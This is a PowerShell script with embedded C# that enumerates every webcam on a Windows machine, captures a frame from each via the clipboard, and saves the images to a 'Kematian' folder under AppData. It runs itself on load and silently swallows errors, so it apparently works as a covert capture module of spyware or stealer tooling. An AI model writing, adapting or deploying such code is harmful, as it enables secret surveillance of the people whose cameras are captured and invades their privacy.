function Get-WebCamImage {
    # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
    $source = @" 
    using System; 
    using System.Collections.Generic; 
    using System.Text; 
    using System.Collections; 
    using System.Runtime.InteropServices; 
    using System.ComponentModel; 
    using System.Data; 
    using System.Drawing; 
    using System.Windows.Forms; 
    
    namespace WebCamLib 
    { 
        public class Device 
        { 
            private const short WM_CAP = 0x400; 
            private const int WM_CAP_DRIVER_CONNECT = 0x40a; 
            private const int WM_CAP_DRIVER_DISCONNECT = 0x40b; 
            private const int WM_CAP_EDIT_COPY = 0x41e; 
            private const int WM_CAP_SET_PREVIEW = 0x432; 
            private const int WM_CAP_SET_OVERLAY = 0x433; 
            private const int WM_CAP_SET_PREVIEWRATE = 0x434; 
            private const int WM_CAP_SET_SCALE = 0x435; 
            private const int WS_CHILD = 0x40000000; 
            private const int WS_VISIBLE = 0x10000000; 
    
            [DllImport("avicap32.dll")] 
            protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, 
                int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID); 
    
            [DllImport("user32", EntryPoint = "SendMessageA")] 
            protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam); 
    
            [DllImport("user32")] 
            protected static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags); 
    
            [DllImport("user32")] 
            protected static extern bool DestroyWindow(int hwnd); 
                    
            int index; 
            int deviceHandle; 
    
            public Device(int index) 
            { 
                this.index = index; 
            } 
    
            private string _name; 
    
            public string Name 
            { 
                get { return _name; } 
                set { _name = value; } 
            } 
    
            private string _version; 
    
            public string Version 
            { 
                get { return _version; } 
                set { _version = value; } 
            } 
    
            public override string ToString() 
            { 
                return this.Name; 
            } 
    
            public void Init(int windowHeight, int windowWidth, int handle) 
            { 
                string deviceIndex = Convert.ToString(this.index); 
                deviceHandle = capCreateCaptureWindowA(ref deviceIndex, WS_VISIBLE | WS_CHILD, 0, 0, windowWidth, windowHeight, handle, 0); 
    
                if (SendMessage(deviceHandle, WM_CAP_DRIVER_CONNECT, this.index, 0) > 0) 
                { 
                    SendMessage(deviceHandle, WM_CAP_SET_SCALE, -1, 0); 
                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEWRATE, 0x42, 0); 
                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEW, -1, 0); 
                    SetWindowPos(deviceHandle, 1, 0, 0, windowWidth, windowHeight, 6); 
                } 
            } 
    
            public void ShowWindow(global::System.Windows.Forms.Control windowsControl) 
            { 
                Init(windowsControl.Height, windowsControl.Width, windowsControl.Handle.ToInt32());                         
            } 
            
            public void CopyC() 
            { 
                SendMessage(this.deviceHandle, WM_CAP_EDIT_COPY, 0, 0);          
            } 
    
            public void Stop() 
            { 
                SendMessage(deviceHandle, WM_CAP_DRIVER_DISCONNECT, this.index, 0); 
                DestroyWindow(deviceHandle); 
            } 
        } 
        
        public class DeviceManager 
        { 
            [DllImport("avicap32.dll")] 
            protected static extern bool capGetDriverDescriptionA(short wDriverIndex, 
                [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName, 
            int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer); 
    
            static ArrayList devices = new ArrayList(); 
    
            public static Device[] GetAllDevices() 
            { 
                String dName = "".PadRight(100); 
                String dVersion = "".PadRight(100); 
    
                for (short i = 0; i < 10; i++) 
                { 
                    if (capGetDriverDescriptionA(i, ref dName, 100, ref dVersion, 100)) 
                    { 
                        Device d = new Device(i); 
                        d.Name = dName.Trim(); 
                        d.Version = dVersion.Trim(); 
                        devices.Add(d);                     
                    } 
                } 
    
                return (Device[])devices.ToArray(typeof(Device)); 
            } 
    
            public static Device GetDevice(int deviceIndex) 
            { 
                return (Device)devices[deviceIndex]; 
            } 
        } 
    } 
"@ 
    Add-Type -AssemblyName System.Drawing  
    $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |   
    Where-Object { $_.FormatDescription -eq "JPEG" }       
    Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.Data, System.Drawing  | Out-Null
    try {
        [reflection.assembly]::loadwithpartialname("System.Windows.Forms") | Out-Null 
        [reflection.assembly]::loadwithpartialname("System.Drawing") | Out-Null 
        $picCapture = New-Object System.Windows.Forms.PictureBox 
        try {
            $devices = [WebCamLib.DeviceManager]::GetAllDevices()
        }
        catch {
            Write-Host "[!] No camera found" -ForegroundColor Red        
        }
        $count = 0
        foreach ($device in $devices) {
            $imagePath = "$env:APPDATA\Kematian\out$count.jpg"
            $device.ShowWindow($picCapture)
            $device.CopyC()
            $bitmap = [Windows.Forms.Clipboard]::GetImage()
            $bitmap.Save($imagePath, $jpegCodec, $ep)
            $bitmap.dispose()
            $count++
            [Windows.Forms.Clipboard]::Clear()
        }

    }
    catch {
        Write-Host "[!] No camera found" -ForegroundColor Red    
    }
}
try { Get-WebCamImage } catch {}
